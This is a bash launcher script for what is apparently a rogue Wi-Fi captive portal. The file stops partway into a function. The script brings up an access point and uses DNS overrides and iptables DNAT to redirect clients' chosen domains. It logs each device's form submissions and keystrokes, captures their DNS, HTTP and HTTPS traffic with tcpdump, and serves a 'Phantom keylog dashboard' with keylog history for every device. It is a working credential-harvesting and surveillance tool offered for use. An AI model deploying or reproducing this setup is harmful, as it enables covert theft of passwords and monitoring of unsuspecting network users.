#!/usr/bin/env bash
# run.sh — one command to start the captive portal. You pick everything AFTER running.
# Usage: sudo ./run.sh
set -u

BASE="$(cd "$(dirname "$0")" && pwd)"
RUN_DIR="$BASE/run"
LAST="$RUN_DIR/last.conf"
STATE_FILE="$RUN_DIR/authorized_macs"

mkdir -p "$RUN_DIR" "$BASE/my-portals"

# ---------- helpers ----------
ask() { # ask VAR "Prompt" "default"
  local __var="$1" __prompt="$2" __def="$3" __ans
  read -r -p "$__prompt [$__def]: " __ans || __ans=""
  [ -z "$__ans" ] && __ans="$__def"
  printf -v "$__var" '%s' "$__ans"
}

pick_number() { # pick_number VAR "Prompt" max
  local __var="$1" __prompt="$2" __max="$3" __ans
  while true; do
    read -r -p "$__prompt [1]: " __ans || __ans=""
    [ -z "$__ans" ] && __ans=1
    if [[ "$__ans" =~ ^[0-9]+$ ]] && [ "$__ans" -ge 1 ] && [ "$__ans" -le "$__max" ]; then
      printf -v "$__var" '%s' "$__ans"
      return
    fi
    echo "Enter 1-$__max."
  done
}

list_wifi_ifaces() {
  iw dev 2>/dev/null | awk '$1=="Interface"{print $2}'
}

detect_country() { # 2-letter reg domain or US fallback
  local c
  c="$(iw reg get 2>/dev/null | grep -m1 -oE '^country [A-Z]{2}(:)?' | grep -oE '[A-Z]{2}' | head -n1)"
  if [ -n "$c" ] && [ "$c" != "00" ]; then echo "$c"; else echo "US"; fi
}

is_dfs_channel() { # 0 if DFS (radar detect: slow start, may drop)
  case "$1" in 52|56|60|64|100|104|108|112|116|120|124|128|132|136|140|144) return 0;; *) return 1;; esac
}

is_valid_5ghz_channel() {
  case "$1" in 36|40|44|48|52|56|60|64|100|104|108|112|116|120|124|128|132|136|140|144|149|153|157|161|165) return 0;; *) return 1;; esac
}

is_valid_24_channel() {
  case "$1" in 1|2|3|4|5|6|7|8|9|10|11|12|13|14) return 0;; *) return 1;; esac
}

phy_of_iface() { # <iface> -> phy name or empty
  iw dev "$1" info 2>/dev/null | awk '/wiphy/{print "phy"$2; exit}'
}

iface_sta_connected() { # 0 if iface is a connected STA (link present)
  iw dev "$1" link 2>/dev/null | grep -q "^Connected to"
}

iface_nm_state() {
  nmcli -t -f DEVICE,STATE dev status 2>/dev/null | awk -F: -v d="$1" '$1==d{print $2; exit}'
}

kill_hostapd_on_iface() {
  # Clear stale hostapd from copied/crashed project folders, but only when
  # its config targets the AP interface we are about to use.
  local pid arg conf
  while read -r pid; do
    [ -n "$pid" ] || continue
    conf=""
    while IFS= read -r -d '' arg; do
      case "$arg" in
        *.conf) conf="$arg" ;;
      esac
    done < "/proc/$pid/cmdline" 2>/dev/null || true
    [ -f "$conf" ] || continue
    if grep -q "^interface=${AP_IFACE}$" "$conf" 2>/dev/null; then
      echo "[*] Stopping stale hostapd on $AP_IFACE (pid $pid, $conf)"
      kill "$pid" 2>/dev/null || true
    fi
  done < <(pgrep -f "hostapd.*\.conf" 2>/dev/null || true)
  sleep 1
}

supports_concurrency() { # 0 if radio allows AP+STA at once
  local phy
  phy="$(phy_of_iface "$1")"
  [ -z "$phy" ] && return 1
  # "interface combinations are not supported" => single mode only.
  if iw phy "$phy" info 2>/dev/null | grep -q "interface combinations are not supported"; then
    return 1
  fi
  return 0
}

channel_disabled_by_reg() { # <channel> -> 0 if firmware/reg disables it for AP
  local ch="$1" line
  # iw list marks it e.g. "* 2484.0 MHz [14] (disabled)"
  line="$(iw list 2>/dev/null | grep -E "\[$ch\]")"
  [ -z "$line" ] && return 1
  printf '%s' "$line" | grep -q "disabled"
}

sane_channel_default() { # <band> <channel> -> safe default for that band
  local band="$1" ch="$2"
  if [ "$band" = "5" ]; then
    is_valid_5ghz_channel "$ch" 2>/dev/null && echo "$ch" || echo "36"
  else
    is_valid_24_channel "$ch" 2>/dev/null && echo "$ch" || echo "6"
  fi
}

ensure_regdomain_for_channel() {
  # Some channels are disabled by the current regdomain (US: 12/13/14).
  # hostapd country_code alone can't override that — try a domain that
  # allows the channel (proven: JP enables 14 for 11b, 12/13 for g).
  # Returns 0 when the channel is usable (or was made usable).
  local ch="$1"
  if ! channel_disabled_by_reg "$ch"; then return 0; fi
  echo "[*] Channel $ch is disabled in current regdomain ($(iw reg get 2>/dev/null | grep -m1 -oE '^country [A-Z]{2}' || echo 'unknown')) — trying regdomain JP..."
  if iw reg set JP 2>/dev/null; then
    sleep 1
    if ! channel_disabled_by_reg "$ch"; then
      echo "[*] Regdomain JP enables channel $ch."
      return 0
    fi
  fi
  echo "[!] Channel $ch is still disabled by firmware/regdomain — pick 1-11 (or 36+ for 5GHz)."
  return 1
}

free_iface_for_ap() {
  # The #1 cause of "Could not configure driver mode" on EVERY channel:
  # the iface is still a connected STA held by NetworkManager/wpa_supplicant.
  # This card (and most single-radio cards) can't do AP+STA at once
  # ("interface combinations are not supported"), so the STA link must go.
  local stale
  # kill leftovers from previous crashed runs (ours + known stray /tmp path)
  pkill -f "hostapd.*${RUN_DIR}/hostapd.conf" 2>/dev/null || true
  pkill -f "hostapd.*/tmp/ap_hostapd.conf" 2>/dev/null || true
  kill_hostapd_on_iface
  stale="$(pgrep -af "hostapd.*\.conf" 2>/dev/null || true)"
  if [ -n "$stale" ]; then
    echo "[!] Another hostapd is still running (holds the radio):"
    echo "$stale" | head -n 5
    echo "    Kill it first (sudo pkill -f hostapd) or it will block every channel."
  fi
  if iface_sta_connected "$AP_IFACE"; then
    echo "[*] $AP_IFACE is connected as a Wi-Fi client:"
    iw dev "$AP_IFACE" link 2>/dev/null | head -n 3
    if ! supports_concurrency "$AP_IFACE"; then
      echo "[!] This radio does NOT support AP+client at the same time."
      echo "    The client connection must be dropped to start the AP."
      if [ "$MODE" = "nat" ] && [ "$UPSTREAM" = "$AP_IFACE" ]; then
        echo "[!] NAT mode needs internet via $UPSTREAM = the AP iface itself —"
        echo "    impossible on this card. Use a 2nd adapter (or USB tether/phone)"
        echo "    as upstream, or run isolated mode."
        return 1
      fi
      echo "[*] Disconnecting $AP_IFACE from Wi-Fi (3s — Ctrl+C to abort)..."
      sleep 3
    else
      echo "[*] Radio supports concurrency — disconnecting STA anyway for a clean AP start..."
    fi
  fi
  rfkill unblock wifi 2>/dev/null || true
  if command -v nmcli >/dev/null 2>&1; then
    # NOTE: order matters. Disconnect FIRST, then set unmanaged.
    # (managed=no alone leaves the STA link up; and the pkill pattern
    # "wpa_supplicant.*iface" never matches NM's "-u" daemon, so it never freed it.)
    nmcli dev disconnect "$AP_IFACE" >/dev/null 2>&1 || true
    sleep 1
    nmcli dev set "$AP_IFACE" managed no >/dev/null 2>&1 || true
    sleep 1
  fi
  ip link set "$AP_IFACE" down 2>/dev/null || true
  sleep 1
  ip addr flush dev "$AP_IFACE" 2>/dev/null || true
  ip addr add "$GATEWAY/24" dev "$AP_IFACE" 2>/dev/null || {
    echo "[!] Cannot assign $GATEWAY/24 to $AP_IFACE — is something still holding it?"
    iw dev "$AP_IFACE" info 2>/dev/null
    return 1
  }
  ip link set "$AP_IFACE" up 2>/dev/null || return 1
  sleep 1
  if iface_sta_connected "$AP_IFACE"; then
    echo "[!] $AP_IFACE is STILL connected as a client — hostapd will fail with"
    echo "    'Could not configure driver mode'. Check NetworkManager/wpa_supplicant."
    return 1
  fi
  return 0
}

diagnose_hostapd_failure() {
  echo "---- diagnostics ----"
  echo "[*] iw dev $AP_IFACE:"; iw dev "$AP_IFACE" info 2>&1 | head -n 8
  echo "[*] link:"; iw dev "$AP_IFACE" link 2>&1 | head -n 4
  if command -v nmcli >/dev/null 2>&1; then
    echo "[*] nmcli:"; nmcli dev status 2>&1 | head -n 8
  fi
  echo "[*] reg:"; iw reg get 2>&1 | head -n 4
  echo "[*] rfkill:"; rfkill list 2>&1 | head -n 8
  echo "[*] other hostapd:"; pgrep -af "hostapd.*\.conf" 2>&1 | head -n 5 || echo "(none)"
  echo "---------------------"
}

kill_stale_hostapd() {
  # A failed `hostapd -B` can linger and hold the radio, making EVERY next
  # channel look broken. Always clear before a (re)try.
  pkill -f "hostapd.*${RUN_DIR}/hostapd.conf" 2>/dev/null || true
  pkill -f "hostapd.*/tmp/ap_hostapd.conf" 2>/dev/null || true
  kill_hostapd_on_iface
  sleep 1
}

reset_iface_between_retries() {
  kill_stale_hostapd
  ip link set "$AP_IFACE" down 2>/dev/null || true
  sleep 1
  ip link set "$AP_IFACE" up 2>/dev/null || true
  sleep 1
}

list_portals() {
  # any folder with an entry page (mirrors server: manifest/index/login/*.html)
  local d f
  for d in "$BASE"/my-portals/*/; do
    [ -d "$d" ] || continue
    for f in "$d"*.html; do
      if [ -f "$f" ]; then basename "$d"; break; fi
    done
  done
}

default_upstream() {
  # Default internet source, EXCLUDING the AP iface itself (using the same
  # single-radio iface for AP+upstream is impossible: no concurrency support).
  local d
  d="$(ip route show default 2>/dev/null | awk '{print $5; exit}')"
  if [ -n "$d" ] && [ "$d" != "${AP_IFACE:-}" ]; then echo "$d"; return; fi
  ip route show default 2>/dev/null | awk -v skip="${AP_IFACE:-}" '$5!=skip{print $5; exit}'
}

clean_domain() { # lowercase, strip scheme/spaces/slashes/quotes
  printf '%s' "$1" | tr '[:upper:]' '[:lower:]' \
    | sed 's#^https\?://##' | tr -d ' /"' | sed 's#/$##'
}

write_redirect_rules() {
  # $REDIRECTS: "src>dst, ..." — dst = portal | IP | domain | host:port.
  # Bare "site.com" (no >) means site.com>portal. Emitted as dnsmasq lines
  # that override the catch-all address=/#/gateway (most-specific wins).
  # host:port entries (e.g. youtube.com>localhost:8080) resolve to an alias IP
  # from run/port_aliases (built by assign_port_aliases); NAT rules for them
  # live in apply_port_redirects.
  # NOTE: a literal-IP src (e.g. 192.168.0.120>...) can never work via DNS
  # (the client dials the IP directly, no lookup happens). Those are skipped
  # here and handled as firewall DNAT in apply_port_redirects instead.
  [ -z "${REDIRECTS:-}" ] && return 0
  local OIFS="$IFS" r src dst
  IFS=','
  for r in $REDIRECTS; do
    src="$(clean_domain "$(printf '%s' "$r" | cut -d'>' -f1)")"
    dst="$(clean_domain "$(printf '%s' "$r" | cut -d'>' -f2 -s)")"
    [ -z "$src" ] && continue
    case "$src" in
      [0-9]*.[0-9]*.[0-9]*.[0-9]*)
        echo "# $src is an IP — redirected by firewall DNAT, not DNS" ;;
      *)
        case "$dst" in
          ""|portal) echo "address=/$src/${GATEWAY:-192.168.5.1}" ;;
          *:*)
            alias="$(lookup_port_alias "$dst")"
            if [ -n "$alias" ]; then echo "address=/$src/$alias";
            else echo "# skipped (bad host:port): $r"; fi ;;
          [0-9]*) echo "address=/$src/$dst" ;;
          *) echo "cname=$src,$dst" ;;
        esac ;;
    esac
  done
  IFS="$OIFS"
}

# --- host:port redirects (e.g. youtube.com>localhost:8080) ---
# DNS can't carry ports, so each unique host:port gets an alias IP on the AP
# iface (run/port_aliases: "alias host port"); NAT then sends alias:80 there.
port_targets() { # stdout: "host port" lines, unique, from $REDIRECTS
  [ -z "${REDIRECTS:-}" ] && return 0
  local OIFS="$IFS" r dst h p seen=""
  IFS=','
  for r in $REDIRECTS; do
    dst="$(clean_domain "$(printf '%s' "$r" | cut -d'>' -f2 -s)")"
    case "$dst" in *:*)
      h="$(printf '%s' "$dst" | cut -d: -f1)"
      p="$(printf '%s' "$dst" | awk -F: '{print $NF}')"
      [ "$h" = "localhost" ] && h="127.0.0.1"
      if [ -n "$h" ] && printf '%s' "$p" | grep -qE '^[0-9]+$' && [ "$p" -ge 1 ] 2>/dev/null && [ "$p" -le 65535 ] 2>/dev/null; then
        printf '%s' "$seen" | grep -qF " $h:$p " || { echo "$h $p"; seen="$seen $h:$p "; }
      else
        echo "[!] Ignoring bad redirect target '$dst' (want host:1-65535)." >&2
      fi ;;
    esac
  done
  IFS="$OIFS"
}

lookup_port_alias() { # <host:port-cleaned> -> alias IP or nothing
  local want="$1" h p
  h="$(printf '%s' "$want" | cut -d: -f1)"; p="$(printf '%s' "$want" | awk -F: '{print $NF}')"
  [ "$h" = "localhost" ] && h="127.0.0.1"
  awk -v h="$h" -v p="$p" '$2==h && $3==p {print $1; exit}' "$RUN_DIR/port_aliases" 2>/dev/null
}

assign_port_aliases() {
  # (re)build run/port_aliases + alias IPs for current $REDIRECTS
  rm -f "$RUN_DIR/port_aliases"
  [ -z "${REDIRECTS:-}" ] && return 0
  local base="${GATEWAY%.*}" gwlast="${GATEWAY##*.}" oct h p alias
  oct=250
  while read -r h p; do
    [ -z "$h" ] && continue
    while [ "$oct" = "$gwlast" ] || [ "$oct" -le 1 ] 2>/dev/null; do oct=$((oct-1)); done
    [ "$oct" -le 1 ] && { echo "[!] No free alias IP for $h:$p — skipping."; continue; }
    alias="$base.$oct"; oct=$((oct-1))
    ip addr add "$alias/24" dev "$AP_IFACE" 2>/dev/null || true
    echo "$alias $h $p" >> "$RUN_DIR/port_aliases"
    echo "[*] Redirect target $h:$p reachable at $alias (DNS points there)"
  done < <(port_targets)
}

apply_port_redirects() {
  # (re)build NAT chain + INPUT accepts + alias IPs from $REDIRECTS.
  # Local targets (127.0.0.1) end at this box. Remote targets (any LAN/internet
  # IP or domain) are marked in mangle so one FORWARD accept + one MASQUERADE
  # carry exactly that traffic — even in isolated mode, and only there.
  iptables -t nat -N REDIRECT_SITES 2>/dev/null || true
  iptables -t nat -F REDIRECT_SITES 2>/dev/null || true
  iptables -t nat -C PREROUTING -i "$AP_IFACE" -j REDIRECT_SITES 2>/dev/null \
    || iptables -t nat -I PREROUTING -i "$AP_IFACE" -j REDIRECT_SITES
  if [ -f "$RUN_DIR/port_aliases" ]; then
    while read -r alias h p; do
      [ -z "$alias" ] && continue
      iptables -t mangle -D PREROUTING -i "$AP_IFACE" -d "$alias" -p tcp --dport 80 \
        -j MARK --set-mark 99 2>/dev/null || true
    done < "$RUN_DIR/port_aliases"
  fi
  assign_port_aliases
  local need_localnet=0 alias h p dh
  if [ -f "$RUN_DIR/port_aliases" ]; then
    while read -r alias h p; do
      [ -z "$alias" ] && continue
      dh="$h"
      case "$dh" in
        127.0.0.1) ;;
        [0-9]*.[0-9]*.[0-9]*.[0-9]*) ;;
        *)
          dh="$(getent ahosts "$dh" 2>/dev/null | awk '/^[0-9.]+ /{print $1; exit}')"
          if [ -z "$dh" ]; then
            echo "[!] Cannot resolve redirect target '$h' — skipping $alias."
            continue
          fi ;;
      esac
      iptables -t nat -C REDIRECT_SITES -d "$alias" -p tcp --dport 80 \
        -j DNAT --to-destination "$dh:$p" 2>/dev/null \
        || iptables -t nat -A REDIRECT_SITES -d "$alias" -p tcp --dport 80 \
             -j DNAT --to-destination "$dh:$p"
      if [ "$dh" = "127.0.0.1" ]; then
        need_localnet=1
        iptables -C INPUT -d 127.0.0.1 -p tcp --dport "$p" -j ACCEPT 2>/dev/null \
          || iptables -A INPUT -d 127.0.0.1 -p tcp --dport "$p" -j ACCEPT
      else
        iptables -t mangle -C PREROUTING -i "$AP_IFACE" -d "$alias" -p tcp --dport 80 \
          -j MARK --set-mark 99 2>/dev/null \
          || iptables -t mangle -A PREROUTING -i "$AP_IFACE" -d "$alias" -p tcp --dport 80 \
               -j MARK --set-mark 99
      fi
    done < "$RUN_DIR/port_aliases"
  fi
  # one accept + one masquerade for exactly the marked redirect traffic
  iptables -C FORWARD -m mark --mark 99 -j ACCEPT 2>/dev/null \
    || iptables -A FORWARD -m mark --mark 99 -j ACCEPT
  iptables -t nat -C POSTROUTING -m mark --mark 99 -j MASQUERADE 2>/dev/null \
    || iptables -t nat -A POSTROUTING -m mark --mark 99 -j MASQUERADE
  # Literal-IP sources (e.g. 192.168.0.120>localhost:8080): DNS never sees
  # them, so DNAT the IP itself. Same target resolution as the alias loop.
  if [ -n "${REDIRECTS:-}" ]; then
    local OIFS2="$IFS" r2 src2 dst2 h2 p2 dh2 dest2
    IFS=','
    for r2 in $REDIRECTS; do
      src2="$(clean_domain "$(printf '%s' "$r2" | cut -d'>' -f1)")"
      dst2="$(clean_domain "$(printf '%s' "$r2" | cut -d'>' -f2 -s)")"
      case "$src2" in [0-9]*.[0-9]*.[0-9]*.[0-9]*) ;; *) continue;; esac
      case "$dst2" in
        ""|portal) dest2="${GATEWAY}:80" ;;
        *:*)
          h2="$(printf '%s' "$dst2" | cut -d: -f1)"
          p2="$(printf '%s' "$dst2" | awk -F: '{print $NF}')"
          [ "$h2" = "localhost" ] && h2="127.0.0.1"
          case "$h2" in
            127.0.0.1|[0-9]*.[0-9]*.[0-9]*.[0-9]*) dh2="$h2" ;;
            *)
              dh2="$(getent ahosts "$h2" 2>/dev/null | awk '/^[0-9.]+ /{print $1; exit}')"
              [ -z "$dh2" ] && { echo "[!] Cannot resolve redirect target '$h2' for IP $src2 — skipping."; continue; } ;;
          esac
          printf '%s' "$p2" | grep -qE '^[0-9]+$' || { echo "[!] Bad port in '$dst2' for IP $src2 — skipping."; continue; }
          dest2="$dh2:$p2"
          if [ "$dh2" != "127.0.0.1" ]; then
            iptables -t mangle -C PREROUTING -i "$AP_IFACE" -d "$src2" -p tcp --dport 80 \
              -j MARK --set-mark 99 2>/dev/null \
              || iptables -t mangle -A PREROUTING -i "$AP_IFACE" -d "$src2" -p tcp --dport 80 \
                   -j MARK --set-mark 99
          else
            need_localnet=1
            iptables -C INPUT -d 127.0.0.1 -p tcp --dport "$p2" -j ACCEPT 2>/dev/null \
              || iptables -A INPUT -d 127.0.0.1 -p tcp --dport "$p2" -j ACCEPT
          fi ;;
        [0-9]*.[0-9]*.[0-9]*.[0-9]*) dest2="$dst2:80"
          iptables -t mangle -C PREROUTING -i "$AP_IFACE" -d "$src2" -p tcp --dport 80 \
            -j MARK --set-mark 99 2>/dev/null \
            || iptables -t mangle -A PREROUTING -i "$AP_IFACE" -d "$src2" -p tcp --dport 80 \
                 -j MARK --set-mark 99 ;;
        *) # domain target for an IP src: resolve then DNAT
          dh2="$(getent ahosts "$dst2" 2>/dev/null | awk '/^[0-9.]+ /{print $1; exit}')"
          [ -z "$dh2" ] && { echo "[!] Cannot resolve redirect target '$dst2' for IP $src2 — skipping."; continue; }
          dest2="$dh2:80"
          iptables -t mangle -C PREROUTING -i "$AP_IFACE" -d "$src2" -p tcp --dport 80 \
            -j MARK --set-mark 99 2>/dev/null \
            || iptables -t mangle -A PREROUTING -i "$AP_IFACE" -d "$src2" -p tcp --dport 80 \
                 -j MARK --set-mark 99 ;;
      esac
      iptables -t nat -C REDIRECT_SITES -d "$src2" -p tcp --dport 80 \
        -j DNAT --to-destination "$dest2" 2>/dev/null \
        || iptables -t nat -A REDIRECT_SITES -d "$src2" -p tcp --dport 80 \
             -j DNAT --to-destination "$dest2"
      echo "[*] Redirect $src2 (IP) -> $dest2"
    done
    IFS="$OIFS2"
  fi
  if [ "$need_localnet" = "1" ]; then
    sysctl -w "net.ipv4.conf.${AP_IFACE}.route_localnet=1" >/dev/null 2>&1 || true
    sysctl -w net.ipv4.conf.all.route_localnet=1 >/dev/null 2>&1 || true
  fi
}

clear_port_redirects() {
  iptables -t nat -D PREROUTING -i "$AP_IFACE" -p tcp --dport 80 -j REDIRECT_SITES 2>/dev/null || true
  iptables -t nat -D PREROUTING -i "$AP_IFACE" -j REDIRECT_SITES 2>/dev/null || true
  iptables -t nat -F REDIRECT_SITES 2>/dev/null || true
  iptables -t nat -X REDIRECT_SITES 2>/dev/null || true
  # mangle MARK rules for literal-IP sources (added per $REDIRECTS in apply)
  if [ -n "${REDIRECTS:-}" ]; then
    local OIFS="$IFS" r src
    IFS=','
    for r in $REDIRECTS; do
      src="$(printf '%s' "$r" | cut -d'>' -f1 | tr '[:upper:]' '[:lower:]' | tr -d ' /"')"
      case "$src" in [0-9]*.[0-9]*.[0-9]*.[0-9]*)
        iptables -t mangle -D PREROUTING -i "$AP_IFACE" -d "$src" -p tcp --dport 80 \
          -j MARK --set-mark 99 2>/dev/null || true ;;
      esac
    done
    IFS="$OIFS"
  fi
  if [ -f "$RUN_DIR/port_aliases" ]; then
    while read -r alias h p; do
      [ -z "$alias" ] && continue
      iptables -t mangle -D PREROUTING -i "$AP_IFACE" -d "$alias" -p tcp --dport 80 \
        -j MARK --set-mark 99 2>/dev/null || true
      ip addr del "$alias/24" dev "$AP_IFACE" 2>/dev/null || true
      [ "$h" = "127.0.0.1" ] && iptables -D INPUT -d 127.0.0.1 -p tcp --dport "$p" -j ACCEPT 2>/dev/null || true
    done < "$RUN_DIR/port_aliases"
    rm -f "$RUN_DIR/port_aliases"
  fi
  iptables -D FORWARD -m mark --mark 99 -j ACCEPT 2>/dev/null || true
  iptables -t nat -D POSTROUTING -m mark --mark 99 -j MASQUERADE 2>/dev/null || true
  sysctl -w "net.ipv4.conf.${AP_IFACE}.route_localnet=0" >/dev/null 2>&1 || true
}

cleanup() {
  # shellcheck disable=SC1090
  [ -f "$LAST" ] && . "$LAST" 2>/dev/null || true
  echo
  echo "[*] Stopping..."
  for p in "$RUN_DIR/portal.pid" "$RUN_DIR/dnsmasq.pid" "$RUN_DIR/hostapd.pid" "$RUN_DIR/traffic.pid" "$RUN_DIR/spy.pid"; do
    if [ -f "$p" ]; then
      kill "$(cat "$p")" 2>/dev/null || true
      rm -f "$p"
    fi
  done
  pkill -f "spy_view.py.*8765" 2>/dev/null || true
  # hostapd may survive without a pid file (e.g. after a crashed run) —
  # match by config path so a stale AP can't block the next start.
  # (This pattern never matches run.sh's own command line.)
  pkill -f "hostapd.*${RUN_DIR}/hostapd.conf" 2>/dev/null || true
  pkill -f "hostapd.*/tmp/ap_hostapd.conf" 2>/dev/null || true
  pkill -f "portal_server.py.*$RUN_DIR" 2>/dev/null || true

  if [ -n "${AP_IFACE:-}" ]; then
    clear_port_redirects
    # foreign chains from other captive tools (e.g. /tmp/ap_*) — remove so they
    # can't hijack our clients on the next run
    for _ch in CAPTIVE_AUTH CAPTIVE_PORTAL; do
      iptables -D FORWARD -j "$_ch" 2>/dev/null || true
      iptables -t nat -D PREROUTING -j "$_ch" 2>/dev/null || true
      iptables -F "$_ch" 2>/dev/null || true
      iptables -X "$_ch" 2>/dev/null || true
      iptables -t nat -F "$_ch" 2>/dev/null || true
      iptables -t nat -X "$_ch" 2>/dev/null || true
    done
    # per-MAC rules added during session
    if [ -f "$STATE_FILE" ]; then
      while read -r mac; do
        [ -z "$mac" ] && continue
        iptables -D FORWARD -i "$AP_IFACE" -m mac --mac-source "$mac" -j ACCEPT 2>/dev/null || true
        iptables -t nat -D CAPTIVE_HTTP -m mac --mac-source "$mac" -j RETURN 2>/dev/null || true
      done < "$STATE_FILE"
    fi
    iptables -t nat -D PREROUTING -i "$AP_IFACE" -p tcp --dport 80 -j CAPTIVE_HTTP 2>/dev/null || true
    iptables -t nat -F CAPTIVE_HTTP 2>/dev/null || true
    iptables -t nat -X CAPTIVE_HTTP 2>/dev/null || true
    iptables -D FORWARD -i "$AP_IFACE" -p tcp --dport 443 -j REJECT --reject-with tcp-reset 2>/dev/null || true
    iptables -D FORWARD -i "$AP_IFACE" -j DROP 2>/dev/null || true
    iptables -D INPUT -i "$AP_IFACE" -p udp --dport 67 -j ACCEPT 2>/dev/null || true
    iptables -D INPUT -i "$AP_IFACE" -p udp --dport 68 -j ACCEPT 2>/dev/null || true
    iptables -D INPUT -i "$AP_IFACE" -p udp --dport 53 -j ACCEPT 2>/dev/null || true
    iptables -D INPUT -i "$AP_IFACE" -p tcp --dport 53 -j ACCEPT 2>/dev/null || true
    iptables -D INPUT -i "$AP_IFACE" -p tcp --dport 80 -j ACCEPT 2>/dev/null || true
    if [ -n "${UPSTREAM:-}" ]; then
      iptables -t nat -D POSTROUTING -o "$UPSTREAM" -j MASQUERADE 2>/dev/null || true
    fi
    ip addr del "${GATEWAY:-192.168.4.1}/24" dev "$AP_IFACE" 2>/dev/null || true
    # restore regdomain if we switched it for 12/13/14
    if [ -f "$RUN_DIR/orig_reg" ]; then
      _or="$(cat "$RUN_DIR/orig_reg" 2>/dev/null)"
      _cur="$(detect_country)"
      if [ -n "$_or" ] && [ "$_or" != "$_cur" ]; then
        iw reg set "$_or" 2>/dev/null || true
      fi
    fi
    if command -v nmcli >/dev/null 2>&1; then
      nmcli dev set "$AP_IFACE" managed yes 2>/dev/null || true
    fi
  fi
  echo "[*] Stopped. Run ./run.sh to start again."
}

start_portal() { # start_portal <portal-name>
  local portal="$1" pid
  if [ -f "$RUN_DIR/portal.pid" ]; then
    kill "$(cat "$RUN_DIR/portal.pid")" 2>/dev/null || true
    rm -f "$RUN_DIR/portal.pid"
    sleep 1
  fi
  python3 "$BASE/portal_server.py" \
    --portal-dir "$BASE/my-portals/$portal" \
    --gateway "$GATEWAY" --port 80 \
    --ap-iface "$AP_IFACE" --state-file "$STATE_FILE" \
    --submit-log "$RUN_DIR/submissions.log" \
    --keys-log "$RUN_DIR/keystrokes.jsonl" \
    --leases-log "$RUN_DIR/dnsmasq.leases" \
    --live "${LIVE:-on}" \
    >>"$RUN_DIR/portal.log" 2>&1 &
  pid=$!
  echo "$pid" > "$RUN_DIR/portal.pid"
  sleep 1
  if ! kill -0 "$pid" 2>/dev/null; then
    echo "[!] Portal failed to start. Log:"
    tail -n 20 "$RUN_DIR/portal.log" || true
    return 1
  fi
  echo "[*] Portal '$portal' on http://$GATEWAY/ (pid $pid)"
}

open_live_window() {
  # Live keystroke viewer in its own foot window, as the desktop user
  # (root usually can't reach the Wayland socket, hence sudo -u).
  [ "${LIVE:-on}" = "on" ] || return 0
  local manual="python3 \"$BASE/live_view.py\" --port 80"
  if ! command -v foot >/dev/null 2>&1; then
    echo "[i] foot not installed — for live typing run manually: $manual"
    return 0
  fi
  if [ -n "${SUDO_USER:-}" ]; then
    sudo -u "$SUDO_USER" env \
      WAYLAND_DISPLAY="${WAYLAND_DISPLAY:-}" \
      XDG_RUNTIME_DIR="${XDG_RUNTIME_DIR:-}" \
      DISPLAY="${DISPLAY:-}" \
      foot -T "Portal LIVE typing" python3 "$BASE/live_view.py" --port 80 \
      >/dev/null 2>&1 &
  else
    foot -T "Portal LIVE typing" python3 "$BASE/live_view.py" --port 80 \
      >/dev/null 2>&1 &
  fi
  sleep 1
  echo "[*] Live typing window requested (foot)."
  echo "[i] If no window appeared (common when sudo strips Wayland env),"
  echo "    open any terminal yourself and run: $manual"
}

start_trafficmon() {
  # Wireshark-lite: tcpdump DNS + HTTP + TLS SYNs on the AP iface -> run/traffic.log
  [ "${NETMON:-on}" = "on" ] || return 0
  if ! command -v tcpdump >/dev/null 2>&1; then
    echo "[i] tcpdump not installed — traffic monitor off (run: sudo apt install tcpdump)"
    return 0
  fi
  if [ -f "$RUN_DIR/traffic.pid" ]; then
    kill "$(cat "$RUN_DIR/traffic.pid")" 2>/dev/null || true
    rm -f "$RUN_DIR/traffic.pid"
  fi
  : > "$RUN_DIR/traffic.log"
  chmod 644 "$RUN_DIR/traffic.log" 2>/dev/null || true
  tcpdump -i "$AP_IFACE" -l -n -q -s 600 -tt \
    'udp port 53 or tcp port 80 or tcp port 443' \
    >>"$RUN_DIR/traffic.log" 2>"$RUN_DIR/tcpdump.err" &
  echo "$!" > "$RUN_DIR/traffic.pid"
  sleep 1
  if ! kill -0 "$(cat "$RUN_DIR/traffic.pid")" 2>/dev/null; then
    echo "[!] tcpdump died on $AP_IFACE:"; tail -n 5 "$RUN_DIR/tcpdump.err" || true
    rm -f "$RUN_DIR/traffic.pid"
    return 1
  fi
  echo "[*] Traffic capture on $AP_IFACE (DNS + HTTP URLs + HTTPS sites)"
}

open_traffic_window() {
  # Per-device sites/URLs viewer in its own foot window, as the desktop user.
  [ "${NETMON:-on}" = "on" ] || return 0
  local manual="python3 \"$BASE/traffic_view.py\" --iface \"$AP_IFACE\" --gateway \"$GATEWAY\""
  if ! command -v foot >/dev/null 2>&1; then
    echo "[i] foot not installed — for traffic view run manually: $manual"
    return 0
  fi
  if [ -n "${SUDO_USER:-}" ]; then
    sudo -u "$SUDO_USER" env \
      WAYLAND_DISPLAY="${WAYLAND_DISPLAY:-}" \
      XDG_RUNTIME_DIR="${XDG_RUNTIME_DIR:-}" \
      DISPLAY="${DISPLAY:-}" \
      foot -T "Portal TRAFFIC" python3 "$BASE/traffic_view.py" \
        --iface "$AP_IFACE" --gateway "$GATEWAY" \
      >/dev/null 2>&1 &
  else
    foot -T "Portal TRAFFIC" python3 "$BASE/traffic_view.py" \
      --iface "$AP_IFACE" --gateway "$GATEWAY" \
      >/dev/null 2>&1 &
  fi
  sleep 1
  echo "[*] Traffic window requested (foot)."
  echo "[i] If no window appeared, open any terminal yourself and run: $manual"
}

start_spy() {
  # Phantom keylog dashboard: proxies portal /live+/tape+/history+/submissions
  # to http://127.0.0.1:8765/ (no root needed to VIEW, runs as root here).
  [ "${SPY:-on}" = "on" ] || return 0
  if [ -f "$RUN_DIR/spy.pid" ]; then
    kill "$(cat "$RUN_DIR/spy.pid")" 2>/dev/null || true
    rm -f "$RUN_DIR/spy.pid"
    sleep 1
  fi
  pkill -f "spy_view.py.*8765" 2>/dev/null || true
  python3 "$BASE/spy_view.py" \
    --portal-host 127.0.0.1 --portal-port 80 \
    --host 127.0.0.1 --port 8765 \
    >>"$RUN_DIR/spy.log" 2>&1 &
  local pid=$!
  echo "$pid" > "$RUN_DIR/spy.pid"
  sleep 1
  if ! kill -0 "$pid" 2>/dev/null; then
    echo "[!] Spy dashboard failed to start. Log:"
    tail -n 20 "$RUN_DIR/spy.log" || true
    rm -f "$RUN_DIR/spy.pid"
    return 1
  fi
  # portal may need a second to bind :80; verify feed (non-fatal)
  if ! curl -s -m 3 http://127.0.0.1:8765/api/history?tail=10 >/dev/null 2>&1; then
    echo "[i] Spy dashboard starting (portal feed warming up)..."
  fi
  echo "[*] Spy dashboard on http://127.0.0.1:8765/ (pid $pid) — live + KEYLOG HISTORY per device"
}

show_spy_status() {
